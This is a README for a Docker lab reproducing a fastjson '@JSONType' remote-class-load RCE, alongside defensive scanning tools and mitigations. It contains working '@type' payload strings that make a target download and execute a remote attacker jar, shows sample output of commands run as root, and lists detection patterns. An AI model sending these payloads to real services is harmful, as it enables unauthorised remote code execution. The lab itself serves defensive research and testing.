# fastjson `@JSONType` remote-class-load RCE — lab, exploit & scanner

A self-contained Docker lab that reproduces the fastjson 1.2.66–1.2.83 **`@JSONType`
remote-class-load RCE**, plus a defensive scanner to check your own environment.

> The bug: `ParserConfig.checkAutoType` probes every `@type` value for the `@JSONType`
> annotation by doing `getResourceAsStream(typeName.replace('.','/') + ".class")`. A crafted
> `@type` such as `jar:http:..2130706433:18080.probe!.POC` becomes the URL
> `jar:http://127.0.0.1:18080/probe!/POC.class`; a classloader that resolves `jar:http://`
> resource names (Spring Boot's `LaunchedURLClassLoader`) fetches a **remote attacker jar**,
> `defineClass`es it, and its static initializer runs = **RCE**. It works with **autoType
> disabled** and through **type-bound `JSON.parseObject(body, Dto.class)`** — so "bind to a
> DTO" is *not* a mitigation. Full walk-through in [`docs/MECHANISM.md`](docs/MECHANISM.md).

## ⚠️ Authorized use only

This repository is for **education, defensive research, and authorized testing** of systems
you own or are explicitly permitted to test. The lab target binds to `127.0.0.1` and the
payload's default action is a benign `id` written to a file. Do not point the exploit or the
active scanner at systems you do not own. You are responsible for how you use this.

## Requirements
- Docker + Docker Compose
- Outbound access to Maven Central (first build only, to fetch fastjson / spring-boot-loader / asm)

## Quick start

```bash
make up          # build + start attacker and target (JDK 8, fastjson 1.2.83)
make exploit     # fire ONE payload and prove code execution in the target
make down        # tear down
```

Expected `make exploit` output:

```
[*] payload : {"@type":"jar:http:..attacker:8000.probe!.POC","x":1}
[*] response: {"ok":false,"error":"ClassCastException"}     <- RCE already fired, THEN the cast
[*] PROOF — command output captured inside the TARGET container (/tmp/PWNED):
------------------------------------------------------------------
uid=0(root) gid=0(root) groups=0(root)
RCE_via_fastjson_JSONType
------------------------------------------------------------------
```

The `ClassCastException` is the tell that binding is not a mitigation: the attacker class
runs its `<clinit>` during the `@type` probe, *before* fastjson tries to cast it to `Dto`.

### Try the variations
- **SSRF-only downgrade:** change `target/Dockerfile`'s base image to `eclipse-temurin:17-jdk`
  and re-run — the attacker log still shows the fetch (SSRF) but no `/tmp/PWNED` (JDK 9+ blocks
  the crafted-name `defineClass`).
- **Prove it's not autoType:** the target never calls `setAutoTypeSupport(true)` — check the
  banner at `http://127.0.0.1:8080/`.
- **Custom command:** `PWN_CMD='touch /tmp/i_was_here' docker compose up -d --build attacker`.

## Repository layout

| Path | What |
|---|---|
| `target/` | vulnerable app — `JSON.parseObject(body, Dto.class)` under a Spring Boot `LaunchedURLClassLoader` |
| `attacker/` | crafts the `@JSONType` class (`Gen.java`) and serves it as a remote jar |
| `exploit/` | `exploit.sh` — one-payload PoC + proof |
| `scanner/` | **defensive** detection you can run on your own fleet (see below) |
| `docs/MECHANISM.md` | annotated source walk-through |

## Scan your own environment

The [`scanner/`](scanner/) directory ships three dependency-free Python 3 tools:

- **`fjscan_static.py`** — inventory jars/wars for the vulnerable combination
  (fastjson 1.2.66–83 × Spring Boot fat-jar loader). CI-gate friendly (exit 2 on `EXPOSED`).
- **`fjscan_probe.py`** — active, **safe** reachability check: fires the `@type` at a canary
  you control (built-in listener **or** Burp Collaborator / interactsh) and correlates the
  SSRF callback. Serves nothing → SSRF only, never RCE.
- **`fjpayload.py`** — generate a ready payload for Burp Repeater with an out-of-band host.

```bash
python3 scanner/fjscan_static.py /path/to/artifacts
python3 scanner/fjscan_probe.py --collaborator <your-collab-or-ip> --targets targets.txt
```

See [`scanner/README.md`](scanner/README.md) — including the important note that a **dotted**
Collaborator subdomain cannot be used directly (the sink turns dots into slashes), so hosts are
encoded as integer IPs and correlation is by URL path token.

## Mitigation
`-Dfastjson.parser.safeMode=true` · restrict runtime egress · JDK 9+ (RCE→SSRF) · migrate to
fastjson2 / drop fastjson 1.x on untrusted paths · alert on `@type` containing `jar:` / `!` /
`..` / integer-IP literals.

## Credits & references

- **Original disclosure:** Kirill Firsov (**@k_firsov**, FearsOff) — public claim of a
  gadget-free RCE in fastjson 1.2.83 (July 2026).
- **Public proof-of-concept & the `@JSONType` / jar-URL-internal-name technique:**
  **@wouijvziqy** — <https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC>.
  `attacker/Gen.java` re-implements that technique for this lab.
- fastjson — <https://github.com/alibaba/fastjson> (see also `safeMode`, and the autoType
  history behind CVE-2022-25845).

This lab and the `scanner/` tooling package those findings into a reproducible testbed and
defensive checks. Not affiliated with or endorsed by the researchers above.
